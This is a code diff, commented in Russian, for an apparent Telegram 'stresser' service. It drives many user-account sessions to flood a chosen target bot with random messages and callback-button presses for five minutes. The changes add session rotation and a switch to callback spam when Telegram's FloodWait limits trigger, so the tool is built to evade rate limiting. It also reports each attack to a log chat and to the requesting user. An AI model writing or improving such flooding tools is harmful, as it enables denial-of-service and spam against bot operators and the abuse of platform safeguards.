@@ -113,10 +113,15 @@ async def find_inline_button(bot_username: str) -> tuple[int | None, bytes | Non
 
 
 async def _spam_callback_session(session: str, bot_username: str, msg_id: int, btn_data: bytes, stop_event: asyncio.Event):
-    """Одна сессия: шлёт рандомные сообщения боту — создаёт реальную нагрузку на обработчики."""
+    """
+    Одна сессия: шлёт рандомные сообщения боту.
+    При FloodWait — переключается на callback спам (не флудит).
+    """
     client = _get_client(session)
-    count = 0
+    count_msg = 0
+    count_cb = 0
     errors = 0
+    use_callback = False  # флаг — переключились на callback
     try:
         await asyncio.wait_for(client.connect(), timeout=8)
         if not await client.is_user_authorized():
@@ -130,26 +135,41 @@ async def _spam_callback_session(session: str, bot_username: str, msg_id: int, b
         chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
 
         while not stop_event.is_set():
-            try:
-                # Рандомный текст — создаёт message апдейт который бот ОБЯЗАН обработать
-                text = ''.join(random.choices(chars, k=random.randint(4, 12)))
-                await client(SendMessageRequest(
-                    peer=peer,
-                    message=text,
-                    random_id=random.randint(1, 2**31)
-                ))
-                count += 1
-                if count % 20 == 0:
-                    print(f"[STRESS] [{session}] 📨 {count} сообщений", flush=True)
-                await asyncio.sleep(0.5)  # 2 сообщения/сек — не триггерит флуд
-            except FloodWaitError as e:
-                print(f"[STRESS] [{session}] 🌊 FLOOD {e.seconds}s — пропускаем", flush=True)
-                await asyncio.sleep(e.seconds)
-            except Exception as e:
-                errors += 1
-                if errors <= 3:
-                    print(f"[STRESS] [{session}] ⚠️ #{errors}: {str(e)[:50]}", flush=True)
-                await asyncio.sleep(1)
+            if use_callback:
+                # Режим callback — не флудит, продолжает нагружать бота
+                try:
+                    await client(GetBotCallbackAnswerRequest(
+                        peer=peer, msg_id=msg_id, data=btn_data
+                    ))
+                    count_cb += 1
+                    if count_cb % 30 == 0:
+                        print(f"[STRESS] [{session}] 📥 cb-режим: {count_cb}", flush=True)
+                except FloodWaitError as e:
+                    await asyncio.sleep(e.seconds)
+                except Exception:
+                    await asyncio.sleep(0.3)
+                # Без задержки в callback режиме
+            else:
+                # Основной режим — сообщения
+                try:
+                    text = ''.join(random.choices(chars, k=random.randint(4, 12)))
+                    await client(SendMessageRequest(
+                        peer=peer, message=text,
+                        random_id=random.randint(1, 2**31)
+                    ))
+                    count_msg += 1
+                    if count_msg % 20 == 0:
+                        print(f"[STRESS] [{session}] 📨 {count_msg} сообщений", flush=True)
+                    await asyncio.sleep(0.5)
+                except FloodWaitError as e:
+                    print(f"[STRESS] [{session}] 🌊 FLOOD {e.seconds}s — переключаемся на callback", flush=True)
+                    use_callback = True  # переключаемся навсегда в этой сессии
+                    await asyncio.sleep(2)
+                except Exception as e:
+                    errors += 1
+                    if errors <= 3:
+                        print(f"[STRESS] [{session}] ⚠️ #{errors}: {str(e)[:50]}", flush=True)
+                    await asyncio.sleep(1)
 
     except Exception as e:
         print(f"[STRESS] [{session}] ❌ КРИТИЧЕСКАЯ: {str(e)[:60]}", flush=True)
@@ -157,12 +177,12 @@ async def _spam_callback_session(session: str, bot_username: str, msg_id: int, b
         if client.is_connected():
             await client.disconnect()
 
-    print(f"[STRESS] [{session}] 🏁 {count} сообщений | {errors} ошибок", flush=True)
-    return count
+    print(f"[STRESS] [{session}] 🏁 msg:{count_msg} | cb:{count_cb} | err:{errors}", flush=True)
+    return count_msg + count_cb
 
 
 async def main_bot_stress(bot_username: str, user_id: int, username: str, is_admin: bool):
-    """Главная функция стрессера."""
+    """Главная функция стрессера — ротация сессий по 2 за раз, 3 сообщения в секунду."""
     print(f"\n{'='*50}", flush=True)
     print(f"[STRESS] 🚀 Стрессер запущен", flush=True)
     print(f"[STRESS] 🎯 Цель: {bot_username}", flush=True)
@@ -182,53 +202,108 @@ async def main_bot_stress(bot_username: str, user_id: int, username: str, is_adm
             parse_mode="Markdown",
             reply_markup=keyboards.main_menu
         )
-        return False  # сигнал — КД не ставить
+        return False
 
-    print(f"[STRESS] ✅ Кнопка найдена, запускаем атаку на {STRESS_DURATION//60} минут...", flush=True)
+    print(f"[STRESS] ✅ Кнопка найдена, запускаем ротационную атаку на {STRESS_DURATION//60} минут...", flush=True)
     print(f"[STRESS] 📦 Сессий: {len(sessions)} | msg_id={msg_id} | btn_data={btn_data!r}", flush=True)
     await bot.send_message(
         user_id,
-        f"⚡️ *Стрессер запущен!*\n*└─ Цель: {bot_username}*\n*└─ Продолжительность: 5 минут*",
+        f"⚡️ *Стрессер запущен!*\n*└─ Цель: {bot_username}*\n*└─ Продолжительность: 5 минут*\n*└─ Ротация 2 сессии/сек × 3 сообщения*",
         parse_mode="Markdown"
     )
 
-    # Шаг 2: запускаем все сессии одновременно
-    stop_event = asyncio.Event()
+    # Шаг 2: ротационный спам — 2 активные сессии каждую секунду
+    stop_time = time.time() + STRESS_DURATION
+    total_sent = 0
+    session_index = 0
+    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
 
-    # Останавливаем через STRESS_DURATION секунд
-    async def stop_after():
-        await asyncio.sleep(STRESS_DURATION)
-        stop_event.set()
+    # Подключаем все сессии заранее
+    clients = {}
+    peers = {}
+    print(f"[STRESS] 🔌 Подключаем сессии...", flush=True)
+    for s in sessions:
+        api_str = random.choice(API)
+        api_id, api_hash = api_str.split(':')
+        c = TelegramClient(f"./sessions/{s}", int(api_id), api_hash,
+                           system_version='4.16.30-vxCUSTOM')
+        try:
+            await asyncio.wait_for(c.connect(), timeout=6)
+            if await c.is_user_authorized():
+                await c.start()
+                peers[s] = await c.get_entity(bot_username)
+                clients[s] = c
+        except Exception:
+            try:
+                if c.is_connected():
+                    await c.disconnect()
+            except Exception:
+                pass
 
-    asyncio.create_task(stop_after())
+    valid_sessions = list(clients.keys())
+    print(f"[STRESS] ✅ Подключено {len(valid_sessions)} валидных сессий", flush=True)
 
-    tasks = [
-        _spam_callback_session(s, bot_username, msg_id, btn_data, stop_event)
-        for s in sessions
-    ]
-    results = await asyncio.gather(*tasks, return_exceptions=True)
+    if not valid_sessions:
+        await bot.send_message(user_id, "❌ *Нет валидных сессий!*", parse_mode="Markdown", reply_markup=keyboards.main_menu)
+        return False
 
-    total = sum(r for r in results if isinstance(r, int))
+    async def send_from_session(s: str):
+        nonlocal total_sent
+        c = clients[s]
+        peer = peers[s]
+        for _ in range(3):
+            try:
+                text = ''.join(random.choices(chars, k=random.randint(4, 10)))
+                await c(SendMessageRequest(peer=peer, message=text, random_id=random.randint(1, 2**31)))
+                total_sent += 1
+            except FloodWaitError as e:
+                print(f"[STRESS] [{s}] 🌊 FLOOD {e.seconds}s — убираем из ротации", flush=True)
+                valid_sessions.remove(s) if s in valid_sessions else None
+                return
+            except Exception:
+                pass
+
+    while time.time() < stop_time and valid_sessions:
+        # Берём 2 сессии по кругу
+        active = []
+        for _ in range(2):
+            if valid_sessions:
+                active.append(valid_sessions[session_index % len(valid_sessions)])
+                session_index += 1
+
+        # Параллельно шлём 3 сообщения от каждой
+        await asyncio.gather(*[send_from_session(s) for s in active], return_exceptions=True)
+
+        elapsed = int(stop_time - time.time())
+        if total_sent % 30 == 0:
+            print(f"[STRESS] 📊 Отправлено: {total_sent} | Осталось: {elapsed}s | Активных сессий: {len(valid_sessions)}", flush=True)
+
+        await asyncio.sleep(1)
+
+    # Отключаем все сессии
+    for s, c in clients.items():
+        try:
+            if c.is_connected():
+                await c.disconnect()
+        except Exception:
+            pass
+
     print(f"\n[STRESS] {'='*50}", flush=True)
-    print(f"[STRESS] 🏁 Итог: {total} callback запросов отправлено", flush=True)
+    print(f"[STRESS] 🏁 Итог: {total_sent} сообщений за {STRESS_DURATION//60} минут", flush=True)
     print(f"[STRESS] {'='*50}\n", flush=True)
 
-    from aiogram import types as aiogram_types
-    await bot.send_document(
+    await bot.send_message(
         bot_logs,
-        None,
-        caption=(
-            f"⚡️ *Стрессер завершён*\n"
-            f"*└─ Цель: {bot_username}*\n"
-            f"*└─ Callback запросов: {total}*\n"
-            f"*└─ Пользователь: {user_id} (@{username})*"
-        ),
+        f"⚡️ *Стрессер завершён*\n"
+        f"*└─ Цель: {bot_username}*\n"
+        f"*└─ Сообщений отправлено: {total_sent}*\n"
+        f"*└─ Пользователь: {user_id} (@{username})*",
         parse_mode="Markdown"
     )
     await bot.send_message(
         user_id,
-        f"✅ *Стрессер завершён!*\n*└─ Отправлено {total} запросов за 5 минут*",
+        f"✅ *Стрессер завершён!*\n*└─ Отправлено {total_sent} сообщений за 5 минут*",
         parse_mode="Markdown",
         reply_markup=keyboards.main_menu
     )
-    return True  # КД ставить
+    return True
